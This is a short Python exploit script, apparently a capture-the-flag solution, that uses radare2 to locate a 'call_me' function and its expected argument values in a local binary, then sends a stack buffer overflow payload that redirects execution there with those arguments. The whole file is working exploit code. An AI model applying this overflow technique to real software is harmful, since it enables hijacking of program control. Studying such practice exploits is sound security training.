import r2pipe
import json
from pwn import *

APP = "./main"
CALL_ME = 0x08048486

ARG1 = None  # 0x11223344
ARG2 = None  # 0x55667788
ARG3 = None  # 0x11335577
BREAK_POINT = None

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis
symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['name'] == 'call_me':
        CALL_ME = i['vaddr']
        print("call_me find on {}".format(hex(CALL_ME)))

r2.cmd('s {}'.format(hex(CALL_ME)))
raw_code = json.loads(r2.cmd('pdfj'))

for opcode in raw_code['ops']:
    if opcode['type'] == 'cmp':
        if not ARG1:
            ARG1 = opcode['val']
            print("arg1 {}".format(hex(opcode['val'])))
        elif not ARG2:
            ARG2 = opcode['val']
            print("arg2 {}".format(hex(opcode['val'])))
        elif not ARG3:
            ARG3 = opcode['val']
            print("arg3 {}".format(hex(opcode['val'])))
    elif opcode['type'] == 'cjmp':
        BREAK_POINT = opcode['jump']
        print("Break point {}".format(hex(opcode['jump'])))


#s = process("./main")

# Uncomment for debugging
s = process(APP)
gdb.attach(s, 'b*{}'.format(BREAK_POINT))

payload = 'A'*128
payload += 'BBBB' # EBP
payload += p32(CALL_ME)

payload += p32(0x41414141) # RET de CALLME

payload += p32(ARG1) # ARG1
payload += p32(ARG2) # ARG2
payload += p32(ARG3) # ARG3

payload += '\n'
s.send(payload)
print(s.recv())
s.close()